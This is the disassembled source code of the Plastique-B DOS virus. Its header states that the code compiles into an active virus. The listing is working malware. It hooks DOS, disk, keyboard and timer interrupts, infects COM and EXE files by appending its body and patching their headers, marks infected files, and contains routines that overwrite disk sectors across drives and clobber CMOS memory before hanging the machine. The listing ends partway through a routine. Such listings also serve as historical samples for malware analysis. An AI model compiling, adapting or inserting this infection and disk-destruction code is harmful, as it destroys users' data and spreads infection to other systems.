PAGE  59,132
  
;==========================================================================
;  		Plastique-B virus Decrypted source code	  			             
;  		    Brought to you by Minuite man						           
;                                        					           
;                DANGER! Not for public distribution						           
;                This source code can be compiled to                                 
;                Active virus.Always handle viruses          
;                Carefully.  	 
;==========================================================================
  
data_1e		equ	3FCh			; (0000:03FC=0F000h)
data_2e		equ	3FEh			; (0000:03FE=16h)
data_3e		equ	3			; (3E00:0003=0FFFFh)
data_4e		equ	5			; (3E00:0005=0FFh)
data_5e		equ	18h			; (3E00:0018=0FFFFh)
data_6e		equ	1Ah			; (3E00:001A=0FFFFh)
data_7e		equ	1Ch			; (3E00:001C=0FFFFh)
data_8e		equ	1Eh			; (3E00:001E=0FFFFh)
data_9e		equ	20h			; (3E00:0020=0FFFFh)
data_10e	equ	22h			; (3E00:0022=0FFFFh)
data_11e	equ	48h			; (3E00:0048=0FFFFh)
data_12e	equ	4Ah			; (3E00:004A=0FFFFh)
data_13e	equ	4Eh			; (3E00:004E=0FFFFh)
data_14e	equ	54h			; (3E00:0054=0FFFFh)
data_15e	equ	56h			; (3E00:0056=0FFFFh)
data_16e	equ	58h			; (3E00:0058=0FFFFh)
data_17e	equ	5Ah			; (3E00:005A=0FFFFh)
data_18e	equ	5Ch			; (3E00:005C=0FFFFh)
data_19e	equ	6Ah			; (3E00:006A=0FFh)
data_20e	equ	86h			; (3E00:0086=0FFFFh)
data_21e	equ	88h			; (3E00:0088=0FFFFh)
data_22e	equ	2A6h			; (3E00:02A6=0FFh)
data_23e	equ	3			; (6C23:0003=0)
data_24e	equ	5			; (6C23:0005=0)
data_25e	equ	6			; (6C23:0006=0)
data_27e	equ	0Ah			; (6C23:000A=0)
data_29e	equ	14h			; (6C23:0014=0)
data_30e	equ	16h			; (6C23:0016=0)
data_31e	equ	24h			; (6C23:0024=0)
data_32e	equ	26h			; (6C23:0026=0)
data_33e	equ	28h			; (6C23:0028=0)
data_34e	equ	2Ah			; (6C23:002A=0)
data_35e	equ	2Ch			; (6C23:002C=0)
data_36e	equ	2Eh			; (6C23:002E=0)
data_37e	equ	30h			; (6C23:0030=0)
data_38e	equ	32h			; (6C23:0032=0)
data_39e	equ	34h			; (6C23:0034=0)
data_41e	equ	38h			; (6C23:0038=0)
data_42e	equ	3Ch			; (6C23:003C=0)
data_43e	equ	3Eh			; (6C23:003E=0)
data_44e	equ	42h			; (6C23:0042=0)
data_45e	equ	44h			; (6C23:0044=0)
data_46e	equ	45h			; (6C23:0045=0)
data_47e	equ	62h			; (6C23:0062=0)
data_48e	equ	64h			; (6C23:0064=0)
data_49e	equ	66h			; (6C23:0066=0)
data_50e	equ	68h			; (6C23:0068=0)
data_51e	equ	69h			; (6C23:0069=0)
data_52e	equ	6Ah			; (6C23:006A=0)
data_68e	equ	160Ah			; (6C23:160A=0)
data_69e	equ	690Ah			; (6C23:690A=0)
data_70e	equ	0FA0Ah			; (6C23:FA0A=0)
  
seg_a		segment
		assume	cs:seg_a, ds:seg_a
  
  
		org	100h
  
test		proc	far
  
start:
		jmp	loc_61			; (09D3)
		db	0CCh, 1, 0C7h, 24h, 1, 9
		db	0Dh, 92h, 25h, 70h, 0, 0
		db	0, 0, 0, 89h, 19h, 0
		db	1, 53h, 13h, 0, 0, 7Eh
		db	82h, 0, 0, 7Eh, 82h
		db	50h
data_53		db	2
data_54		dw	0
data_55		dw	4269h			; Data table (indexed access)
		db	1Fh, 8Bh, 5, 0, 20h, 0
		db	21h, 0, 80h, 0, 0E6h, 77h
		db	18h, 0, 0AAh, 0, 9, 0Dh
		db	60h, 14h, 1Eh, 2, 56h, 5
		db	6, 6Fh, 73h, 12h, 0, 0F0h
		db	16h, 0, 4Dh, 5Ah, 14h, 0
		db	8, 0, 0, 0, 20h, 0
		db	0, 0, 0FFh, 0FFh, 5, 0
		db	0C4h, 0Bh, 89h, 19h, 0, 9
		db	5, 0, 1Eh, 0, 90h, 90h
		db	1, 0, 70h, 45h, 75h, 42h
		db	0, 0, 0
		db	'ACAD.EXECOMMAND.COM.COM.EXE'
		db	10h, 0, 0, 2, 0, 0
		db	80h, 0, 0B4h, 0D5h, 5Ch, 0
		db	0B4h, 0D5h, 6Ch, 0, 0B4h, 0D5h
		db	'Program: Plastique'
loc_2:
		and	[si],dh
		db	'.51 (plastic bomb), '
copyright	db	'Copyright (C) 1988, 1989 by ABT '
		db	'Group.Thanks to: M'
		db	'r. Lin (IECS 762??), Mr. Cheng ('
		db	'FCU Inf-Center)'
		db	1, 0, 0
data_58		db	0E3h			; Data table (indexed access)
		db	8, 0, 0, 0EBh, 7, 91h
		db	0Ah, 91h, 0Ah, 0BEh, 11h, 0
		db	0, 0D0h, 0Fh, 21h, 15h, 21h
		db	15h, 0DCh, 0Bh, 0, 0, 91h
		db	0Ah, 16h, 0Eh, 16h, 0Eh, 0B7h
		db	17h, 0, 0, 21h, 15h, 2Ch
		db	1Ch, 2Ch, 1Ch, 91h, 0Ah, 16h
		db	0Eh, 33h, 0Bh, 33h, 0Bh, 91h
		db	0Ah, 0FAh, 9, 0FAh, 9, 91h
		db	0Ah, 33h, 0Bh, 33h, 0Bh, 91h
		db	0Ah, 16h, 0Eh, 16h, 0Eh, 0
		db	0, 16h, 0Eh, 0D0h, 0Fh, 0BEh
		db	11h, 0, 0, 0E3h, 8, 0
		db	0, 0EBh, 7, 91h, 0Ah, 91h
		db	0Ah, 0BEh, 11h, 0, 0, 0D0h
		db	0Fh, 21h, 15h, 21h, 15h, 0DCh
		db	0Bh, 0, 0, 91h, 0Ah, 16h
		db	0Eh, 16h, 0Eh, 0B7h, 17h, 0
		db	0, 21h, 15h, 2Ch, 1Ch, 2Ch
		db	1Ch, 91h, 0Ah, 16h, 0Eh, 33h
		db	0Bh, 33h, 0Bh, 91h, 0Ah, 0FAh
		db	9
data_59		dw	9FAh
data_60		db	91h
data_61		db	0Ah
data_62		dw	0B33h
data_63		db	33h
  
test		endp
  
;==========================================================================
;
;			External Entry Point
;
;==========================================================================
  
int_24h_entry	proc	far
		or	dx,ds:data_68e[bx+di]	; (6C23:160A=0)
		push	cs
		push	ss
		push	cs
		add	[bx+si],al
		push	ss
		push	cs
		ror	byte ptr [bx],1		; Rotate
		mov	si,11h
		add	ds:data_69e[bx+di],dl	; (6C23:690A=0)
		or	bx,sp
		or	bl,ch
		pop	es
		jmp	short $+9
		db	91h, 0Ah, 0, 0, 0FAh, 9
		db	0FAh, 9, 64h, 8, 64h, 8
int_24h_entry	endp
  
  
;==========================================================================
;
;			External Entry Point
;
;==========================================================================
  
int_08h_entry	proc	far
		push	cs
		pop	es
		add	[bx+si],al
		xchg	ax,cx
		or	dl,ds:data_70e[bx+di]	; (6C23:FA0A=0)
		or	dx,di
		or	[bp+si+0Dh],dx
		add	[bx+si],al
		xor	cx,[bp+di]
		add	[bx+si],al
		push	ss
		push	cs
		add	[bx+si],al
;*		jmp	short loc_4		;*(02F3)
		db	0EBh, 7
		db	0EBh, 7, 91h, 0Ah, 0, 0
		db	33h
loc_4:
		or	si,[bp+di]
		or	bp,[bx+di+9]
		db	69h, 9, 0EBh, 7, 0EBh, 7
		db	0, 0, 0E3h, 8, 0, 0
		db	0EBh, 7, 91h, 0Ah, 91h, 0Ah
		db	0BEh, 11h, 0, 0, 0D0h, 0Fh
		db	21h, 15h, 21h, 15h, 0DCh, 0Bh
		db	0, 0, 0F2h, 0Eh, 0D0h, 0Fh
		db	0, 0, 0BEh, 11h, 21h, 15h
		db	0, 0, 3, 2, 3, 3
		db	0Dh, 3, 2, 3, 3, 0Dh
		db	3, 2, 3, 3, 0Dh, 3
		db	2, 3, 3, 0Dh, 7, 3
		db	3, 7, 3, 3, 7, 3
		db	3, 7, 3, 14h, 2, 1
		db	1, 1, 3, 8, 3, 2
		db	3, 3, 0Dh, 3, 2, 3
		db	3, 0Dh, 3, 2, 3, 3
		db	0Dh, 3, 2, 3, 3
int_08h_entry	endp
  
  
;==========================================================================
;
;			External Entry Point
;
;==========================================================================
  
int_09h_entry	proc	far
		or	ax,307h
		add	ax,[bx]
		add	ax,[bp+di]
		pop	es
		add	ax,[bp+di]
		pop	es
		add	dx,[si]
		add	al,[bx+di]
		add	[bx+di],ax
		add	ax,[bp+di]
		add	[bx+di],ax
		add	[di],cx
		pop	es
		push	es
		add	[di],cx
		or	ax,70Dh
		push	es
		add	[di],cx
		or	ax,70Dh
		push	es
		add	[si],cx
		add	cl,[si]
		add	cl,[di]
		pop	es
		push	es
		add	[di],cx
		or	ax,0D0Dh
		or	ax,0D0Dh
		add	ax,[bp+di]
		add	ax,[bp+di]
		or	ax,303h
		add	ax,[bp+di]
		or	ax,106h
		add	ax,[bp+di]
		add	ax,[bp+di]
		add	ax,[bx+di]
		db	7 dup (0)
		db	32h, 0C0h, 0CFh, 9Ch, 50h, 2Eh
		db	0A1h, 64h, 0, 2Eh, 39h, 6
		db	3, 0, 58h, 77h, 5, 2Eh
		db	0FFh, 6, 3, 0, 51h, 2Eh
		db	8Bh, 0Eh, 3, 0
  
locloop_5:
		nop
		loop	locloop_5		; Loop if cx > 0
  
		int	3			; Debug breakpoint
		pop	cx
		popf				; Pop flags
		jmp	dword ptr cs:data_39e	; (6C23:0034=0)
		db	9Ch, 0CCh, 2Eh, 0FFh, 6, 3
		db	0, 2Eh, 81h, 3Eh, 3, 0
		db	88h, 13h, 77h, 6, 9Dh, 2Eh
		db	0FFh, 2Eh, 34h, 0, 1Eh, 50h
		db	53h, 0Eh, 1Fh, 8Bh, 1Eh, 22h
		db	1, 0FEh, 0Eh, 21h, 1, 75h
		db	5Dh, 8Bh, 1Eh, 22h, 1, 0FFh
		db	6, 22h, 1, 81h, 0FBh, 80h
		db	0, 75h, 3, 0EBh, 36h, 90h
loc_6:
		mov	al,data_58[bx]		; (6C23:0224=0E3h)
		mov	data_53,al		; (6C23:0121=2)
		shl	bx,1			; Shift w/zeros fill
		mov	ax,data_55[bx]		; (6C23:0124=4269h)
		cmp	ax,0
		je	loc_7			; Jump if equal
		jmp	short loc_8		; (0426)
		db	90h
loc_7:
		in	al,61h			; port 61h, 8255 port B, read
		and	al,0FEh
		out	61h,al			; port 61h, 8255 B - spkr, etc
		jmp	short loc_10		; (0454)
		db	90h
loc_8:
		mov	bx,ax
		mov	al,0B6h
		out	43h,al			; port 43h, 8253 wrt timr mode
		mov	ax,bx
		out	42h,al			; port 42h, 8253 timer 2 spkr
		mov	al,ah
		out	42h,al			; port 42h, 8253 timer 2 spkr
		in	al,61h			; port 61h, 8255 port B, read
		or	al,3
		out	61h,al			; port 61h, 8255 B - spkr, etc
		jmp	short loc_10		; (0454)
		db	90h
loc_9:
		in	al,61h			; port 61h, 8255 port B, read
		and	al,0FEh
		out	61h,al			; port 61h, 8255 B - spkr, etc
		mov	data_54,0		; (6C23:0122=0)
		mov	data_53,1		; (6C23:0121=2)
		mov	word ptr ds:data_23e,1	; (6C23:0003=0)
loc_10:
		pop	bx
		pop	ax
		pop	ds
		popf				; Pop flags
		jmp	dword ptr cs:data_39e	; (6C23:0034=0)
		db	0FAh, 50h, 1Eh, 33h, 0C0h, 8Eh
		db	0D8h, 0A0h, 17h, 4, 1Fh, 24h
		db	0Ch, 3Ch, 0Ch, 75h, 2Eh, 0E4h
		db	'`$'
		db	7Fh, '<Su&.'
		db	81h, 3Eh, 3, 0, 88h, 13h
		db	72h, 1Dh, 2Eh, 80h, 3Eh, 69h
		db	0, 1, 74h, 3, 0E9h, 93h
		db	0, 0E4h, 61h, 0Ch, 80h, 0E6h
		db	61h, 24h, 7Fh, 0E6h, 61h, 58h
		db	0B0h, 20h, 0E6h, 20h, 0EBh, 1Fh
		db	90h, 58h, 9Ch, 2Eh, 0FFh, 1Eh
		db	6, 0, 0FAh, 2Eh, 0FFh, 6
		db	0Eh, 0, 2Eh, 81h, 3Eh, 0Eh
		db	0, 0A0h, 0Fh, 72h, 6, 2Eh
		db	0C6h, 6, 6Ah, 0, 1
loc_11:
		sti				; Enable interrupts
		iret				; Interrupt return
int_09h_entry	endp
  
loc_12:
		mov	al,2
		out	21h,al			; port 21h, 8259-1 int comands
		sti				; Enable interrupts
		in	al,61h			; port 61h, 8255 port B, read
		and	al,0FEh
		out	61h,al			; port 61h, 8255 B - spkr, etc
		mov	cs:data_54,0		; (6C23:0122=0)
		mov	cs:data_53,1		; (6C23:0121=2)
		mov	word ptr cs:data_23e,1	; (6C23:0003=0)
		mov	ax,4
		int	10h			; Video display   ah=functn 00h
						;  set display mode in al
		mov	ax,402h
		push	ax
loc_13:
		mov	byte ptr ds:data_52e,0	; (6C23:006A=0)
		push	cs
		pop	ax
		mov	ds,ax
		mov	es,ax
		mov	dl,0
  
;==========================================================================
;
;			External Entry Point
;
;==========================================================================
  
int_13h_entry	proc	far
		call	sub_1			; (052D)
		jc	loc_14			; Jump if carry Set
		call	sub_2			; (059E)
loc_14:
		mov	dl,1
		call	sub_1			; (052D)
		jc	loc_ret_15		; Jump if carry Set
		call	sub_2			; (059E)
  
loc_ret_15:
		retn
int_13h_entry	endp
  
		db	0B2h, 80h, 2Eh, 0C7h, 6, 3
		db	0, 0D4h, 12h, 0E8h, 63h, 0
		db	72h, 3, 0E8h
data_65		dw	0A7h			; Data table (indexed access)
		db	0B2h, 81h, 0E8h, 59h, 0, 72h
		db	3, 0E8h, 9Dh, 0, 0B9h, 40h
		db	0
  
locloop_16:
		mov	al,cl
		out	70h,al			; port 70h, RTC addr/enabl NMI
						;  al = 0, seconds register
		mov	al,0FFh
		out	71h,al			; port 71h, RTC clock/RAM data
		loop	locloop_16		; Loop if cx > 0
  
loc_17:
		nop
		jmp	short loc_17		; (052A)
  
;==========================================================================
;			       SUBROUTINE
;==========================================================================
  
sub_1		proc	near
		mov	data_61,dl		; (6C23:02A7=0Ah)
		mov	ax,201h
		mov	cx,1
		mov	dh,0
		mov	bx,511h
		int	13h			; Disk  dl=drive #: ah=func a2h
						;  read sectors to memory es:bx
		jc	loc_ret_18		; Jump if carry Set
		mov	si,18h
		mov	cx,data_65[si]		; (6C23:0511=0A7h)
		mov	data_60,cl		; (6C23:02A6=91h)
		mov	si,13h
		mov	ax,data_65[si]		; (6C23:0511=0A7h)
		xor	dx,dx			; Zero register
		div	cx			; ax,dx rem=dx:ax/reg
		mov	si,1Ah
		mov	cx,data_65[si]		; (6C23:0511=0A7h)
		xor	dx,dx			; Zero register
		div	cx			; ax,dx rem=dx:ax/reg
		mov	data_59,ax		; (6C23:02A4=9FAh)
		mov	dl,data_61		; (6C23:02A7=0Ah)
		mov	dh,0
		mov	cx,1
		cmp	cx,0
  
loc_ret_18:
		retn
sub_1		endp
  
		db	0B4h, 8, 88h, 16h, 0A7h, 2
		db	0CDh, 13h, 72h, 22h, 88h, 36h
		db	0AAh, 2, 8Ah, 0C5h, 8Ah, 0E1h
		db	80h, 0E1h, 3Fh, 88h, 0Eh, 0A6h
		db	2, 0B1h, 6, 0D2h, 0ECh, 0A3h
		db	0A4h, 2, 8Ah, 16h, 0A7h, 2
		db	0B6h, 0, 0B9h, 1, 0, 83h
		db	0F9h, 0
  
loc_ret_19:
		retn
  
;==========================================================================
;			       SUBROUTINE
;==========================================================================
  
sub_2		proc	near
		mov	bx,98h
loc_20:
		mov	al,data_60		; (6C23:02A6=91h)
		mov	ah,3
		int	13h			; Disk  dl=drive #: ah=func a3h
						;  write sectors from mem es:bx
		jnc	loc_21			; Jump if carry=0
		and	ah,0C3h
		jnz	loc_ret_22		; Jump if not zero
loc_21:
		inc	ch
		cmp	ch,byte ptr data_59	; (6C23:02A4=0FAh)
		je	loc_ret_22		; Jump if equal
		jmp	short loc_20		; (05A1)
  
loc_ret_22:
		retn
sub_2		endp
  
  
;==========================================================================
;			       SUBROUTINE
;==========================================================================
  
sub_3		proc	near
		mov	bx,98h
		mov	data_62,0		; (6C23:02A8=0B33h)
loc_23:
		mov	al,data_60		; (6C23:02A6=91h)
		mov	ah,3
		int	13h			; Disk  dl=drive #: ah=func a3h
						;  write sectors from mem es:bx
		inc	dh
		cmp	dh,data_63		; (6C23:02AA=33h)
		ja	loc_24			; Jump if above
		jmp	short loc_23		; (05C3)
loc_24:
		inc	data_62			; (6C23:02A8=0B33h)
		mov	dh,0
		mov	ax,data_62		; (6C23:02A8=0B33h)
		cmp	ax,data_59		; (6C23:02A4=9FAh)
		ja	loc_ret_25		; Jump if above
		or	al,1
		add	ch,al
		jnc	loc_23			; Jump if carry=0
		add	cl,40h			; '@'
		jmp	short loc_23		; (05C3)
  
loc_ret_25:
		retn
sub_3		endp
  
		db	52h, 80h, 0FCh, 3, 75h, 12h
		db	2Eh, 0C7h, 6, 0Eh, 0, 0
		db	0, 2Eh, 80h, 3Eh, 6Ah, 0
		db	1, 75h, 3, 0BAh, 0FFh, 0FFh
		db	9Ch, 2Eh, 0FFh, 1Eh, 0Ah, 0
		db	5Ah, 0CAh, 2, 0, 9Ch, 3Dh
		db	40h, 4Bh, 75h, 5, 0B8h, 78h
		db	56h, 9Dh, 0CFh, 3Dh, 41h, 4Bh
		db	74h, 1Eh, 3Dh, 0, 4Bh, 75h
		db	3, 0EBh, 34h, 90h
loc_26:
		cmp	ax,3D00h
		jne	loc_27			; Jump if not equal
		cmp	byte ptr cs:data_50e,1	; (6C23:0068=0)
		je	loc_27			; Jump if equal
		jmp	short loc_29		; (065C)
		db	90h
loc_27:
		popf				; Pop flags
		jmp	dword ptr cs:data_41e	; (6C23:0038=0)
loc_28:
		pop	ax
		pop	ax
		mov	ax,100h
		mov	cs:data_29e,ax		; (6C23:0014=0)
		pop	ax
		mov	cs:data_30e,ax		; (6C23:0016=0)
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		popf				; Pop flags
		call	sub_5			; (09C8)
		mov	cx,ds:data_38e		; (6C23:0032=0)
		jmp	dword ptr cs:data_29e	; (6C23:0014=0)
loc_29:
		mov	word ptr cs:data_33e,0FFFFh	; (6C23:0028=0)
		mov	word ptr cs:data_47e,0	; (6C23:0062=0)
		mov	cs:data_31e,dx		; (6C23:0024=0)
		mov	cs:data_32e,ds		; (6C23:0026=0)
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	ds
		push	es
		cld				; Clear direction
		mov	si,dx
loc_30:
		mov	al,[si]
		or	al,al			; Zero ?
		jz	loc_32			; Jump if zero
		cmp	al,61h			; 'a'
		jb	loc_31			; Jump if below
		cmp	al,7Ah			; 'z'
		ja	loc_31			; Jump if above
		sub	byte ptr [si],20h	; ' '
loc_31:
		inc	si
		jmp	short loc_30		; (067F)
loc_32:
		mov	cs:data_49e,si		; (6C23:0066=0)
		mov	ax,si
		push	cs
		pop	es
		mov	cx,0Bh
		sub	si,cx
		mov	di,73h
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jnz	loc_33			; Jump if not zero
		jmp	loc_59			; (0997)
loc_33:
		mov	si,ax
		mov	cx,8
		sub	si,cx
		mov	di,6Bh
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jnz	loc_34			; Jump if not zero
		mov	ax,41Dh
		push	ax
		jmp	loc_13			; (04E2)
loc_34:
		mov	ax,4300h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		jc	loc_35			; Jump if carry Set
		mov	cs:data_34e,cx		; (6C23:002A=0)
loc_35:
		jc	loc_41			; Jump if carry Set
		xor	al,al			; Zero register
		mov	cs:data_46e,al		; (6C23:0045=0)
		mov	si,cs:data_49e		; (6C23:0066=0)
		mov	cx,4
		sub	si,cx
		mov	di,7Eh
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jz	loc_36			; Jump if zero
		inc	byte ptr cs:data_46e	; (6C23:0045=0)
		mov	si,cs:data_49e		; (6C23:0066=0)
		mov	cx,4
		sub	si,cx
		mov	di,82h
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jz	loc_36			; Jump if zero
		add	cx,0FFFFh
		jmp	short loc_41		; (073F)
		db	90h
loc_36:
		mov	di,dx
		xor	dl,dl			; Zero register
		cmp	byte ptr [di+1],3Ah	; ':'
		jne	loc_37			; Jump if not equal
		mov	dl,[di]
		and	dl,1Fh
loc_37:
		mov	ah,36h			; '6'
		int	21h			; DOS Services  ah=function 36h
						;  get free space, drive dl,1=a:
		cmp	ax,0FFFFh
		jne	loc_39			; Jump if not equal
loc_38:
		jmp	loc_59			; (0997)
loc_39:
		mul	bx			; dx:ax = reg * ax
		mul	cx			; dx:ax = reg * ax
		or	dx,dx			; Zero ?
		jnz	loc_40			; Jump if not zero
		cmp	ax,0BC4h
		jb	loc_38			; Jump if below
loc_40:
		mov	dx,cs:data_31e		; (6C23:0024=0)
		mov	ax,3D00h
		mov	byte ptr cs:data_50e,1	; (6C23:0068=0)
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	byte ptr cs:data_50e,0	; (6C23:0068=0)
loc_41:
		jc	loc_43			; Jump if carry Set
		mov	cs:data_33e,ax		; (6C23:0028=0)
		mov	bx,ax
		mov	ax,4202h
		mov	cx,0FFFFh
		mov	dx,0FFFBh
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		jc	loc_43			; Jump if carry Set
		add	ax,5
		mov	cs:data_38e,ax		; (6C23:0032=0)
		mov	ax,4200h
		mov	cx,0
		mov	dx,12h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		jc	loc_43			; Jump if carry Set
		mov	cx,2
		mov	dx,60h
		mov	di,dx
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		mov	ax,[di]
		cmp	ax,1989h
		jne	loc_42			; Jump if not equal
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jmp	loc_59			; (0997)
loc_42:
		mov	ax,3524h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:data_42e,bx		; (6C23:003C=0)
		mov	ds:data_43e,es		; (6C23:003E=0)
		mov	dx,2ABh
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		lds	dx,dword ptr ds:data_31e	; (6C23:0024=0) Load 32 bit ptr
		xor	cx,cx			; Zero register
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
loc_43:
		jc	loc_44			; Jump if carry Set
		mov	bx,cs:data_33e		; (6C23:0028=0)
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	word ptr cs:data_33e,0FFFFh	; (6C23:0028=0)
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_44			; Jump if carry Set
		mov	cs:data_33e,ax		; (6C23:0028=0)
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		mov	bx,ds:data_33e		; (6C23:0028=0)
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ds:data_35e,dx		; (6C23:002C=0)
		mov	ds:data_36e,cx		; (6C23:002E=0)
		mov	ax,4200h
		xor	cx,cx			; Zero register
		mov	dx,cx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
loc_44:
		jc	loc_47			; Jump if carry Set
		cmp	byte ptr ds:data_46e,0	; (6C23:0045=0)
		je	loc_45			; Jump if equal
		jmp	short loc_49		; (0867)
		db	90h
loc_45:
		mov	bx,1000h
		mov	ah,48h			; 'H'
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		jnc	loc_46			; Jump if carry=0
		mov	ah,3Eh			; '>'
		mov	bx,ds:data_33e		; (6C23:0028=0)
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jmp	loc_59			; (0997)
loc_46:
		inc	word ptr ds:data_47e	; (6C23:0062=0)
		mov	es,ax
		xor	si,si			; Zero register
		mov	di,si
		inc	word ptr ds:data_23e	; (6C23:0003=0)
		mov	ax,ds:data_23e		; (6C23:0003=0)
		or	al,1
		mov	ds:data_24e,al		; (6C23:0005=0)
		call	sub_4			; (09A5)
		mov	cx,0BC4h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		call	sub_4			; (09A5)
		mov	dx,di
		mov	cx,ds:data_38e		; (6C23:0032=0)
		mov	bx,ds:data_33e		; (6C23:0028=0)
		push	es
		pop	ds
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
loc_47:
		jc	loc_48			; Jump if carry Set
		add	di,cx
		jc	loc_48			; Jump if carry Set
		xor	cx,cx			; Zero register
		mov	dx,cx
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	cx,di
		xor	dx,dx			; Zero register
		mov	ah,ds:data_19e		; (3E00:006A=0FFh)
		mov	ds:data_22e,ah		; (3E00:02A6=0FFh)
		mov	byte ptr ds:data_19e,0	; (3E00:006A=0FFh)
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		mov	ah,ds:data_22e		; (3E00:02A6=0FFh)
		mov	ds:data_19e,ah		; (3E00:006A=0FFh)
loc_48:
		jc	loc_50			; Jump if carry Set
		jmp	loc_57			; (0952)
loc_49:
		mov	cx,1Ch
		mov	dx,46h
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
loc_50:
		jc	loc_52			; Jump if carry Set
		cmp	word ptr ds:data_16e,1989h	; (3E00:0058=0FFFFh)
		je	loc_52			; Jump if equal
		mov	word ptr ds:data_16e,1989h	; (3E00:0058=0FFFFh)
		mov	ax,ds:data_14e		; (3E00:0054=0FFFFh)
		mov	ds:data_6e,ax		; (3E00:001A=0FFFFh)
		mov	ax,ds:data_15e		; (3E00:0056=0FFFFh)
		mov	ds:data_5e,ax		; (3E00:0018=0FFFFh)
		mov	ax,ds:data_17e		; (3E00:005A=0FFFFh)
		mov	ds:data_7e,ax		; (3E00:001C=0FFFFh)
		mov	ax,ds:data_18e		; (3E00:005C=0FFFFh)
		mov	ds:data_8e,ax		; (3E00:001E=0FFFFh)
		mov	ax,ds:data_12e		; (3E00:004A=0FFFFh)
		cmp	word ptr ds:data_11e,0	; (3E00:0048=0FFFFh)
		je	loc_51			; Jump if equal
		dec	ax
loc_51:
		mul	word ptr ds:data_21e	; (3E00:0088=0FFFFh) ax = data * ax
		add	ax,ds:data_11e		; (3E00:0048=0FFFFh)
		adc	dx,0
		add	ax,0Fh
		adc	dx,0
		and	ax,0FFF0h
		mov	ds:data_9e,ax		; (3E00:0020=0FFFFh)
		mov	ds:data_10e,dx		; (3E00:0022=0FFFFh)
		add	ax,0BC4h
		adc	dx,0
loc_52:
		jc	loc_54			; Jump if carry Set
		div	word ptr ds:data_21e	; (3E00:0088=0FFFFh) ax,dxrem=dx:ax/da
		or	dx,dx			; Zero ?
		jz	loc_53			; Jump if zero
		inc	ax
loc_53:
		mov	ds:data_12e,ax		; (3E00:004A=0FFFFh)
		mov	ds:data_11e,dx		; (3E00:0048=0FFFFh)
		mov	ax,ds:data_9e		; (3E00:0020=0FFFFh)
		mov	dx,ds:data_10e		; (3E00:0022=0FFFFh)
		div	word ptr ds:data_20e	; (3E00:0086=0FFFFh) ax,dxrem=dx:ax/da
		sub	ax,ds:data_13e		; (3E00:004E=0FFFFh)
		mov	ds:data_18e,ax		; (3E00:005C=0FFFFh)
		mov	word ptr ds:data_17e,900h	; (3E00:005A=0FFFFh)
		mov	ds:data_14e,ax		; (3E00:0054=0FFFFh)
		mov	word ptr ds:data_15e,0BC4h	; (3E00:0056=0FFFFh)
		xor	cx,cx			; Zero register
		mov	dx,cx
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
loc_54:
		jc	loc_55			; Jump if carry Set
		mov	cx,1Ch
		mov	dx,46h
		mov	ah,ds:data_19e		; (3E00:006A=0FFh)
		mov	ds:data_22e,ah		; (3E00:02A6=0FFh)
		mov	byte ptr ds:data_19e,0	; (3E00:006A=0FFh)
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		mov	ah,ds:data_22e		; (3E00:02A6=0FFh)
		mov	ds:data_19e,ah		; (3E00:006A=0FFh)
loc_55:
		jc	loc_56			; Jump if carry Set
		cmp	ax,cx
		jne	loc_57			; Jump if not equal
		mov	dx,ds:data_9e		; (3E00:0020=0FFFFh)
		mov	cx,ds:data_10e		; (3E00:0022=0FFFFh)
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
loc_56:
		jc	loc_57			; Jump if carry Set
		inc	word ptr ds:data_3e	; (3E00:0003=0FFFFh)
		mov	ax,ds:data_3e		; (3E00:0003=0FFFFh)
		or	al,1
		mov	ds:data_4e,al		; (3E00:0005=0FFh)
		call	sub_4			; (09A5)
		xor	dx,dx			; Zero register
		mov	cx,0BC4h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		call	sub_4			; (09A5)
loc_57:
		cmp	word ptr cs:data_47e,0	; (6C23:0062=0)
		je	loc_58			; Jump if equal
		mov	ah,49h			; 'I'
		int	21h			; DOS Services  ah=function 49h
						;  release memory block, es=seg
loc_58:
		cmp	word ptr cs:data_33e,0FFFFh	; (6C23:0028=0)
		je	loc_59			; Jump if equal
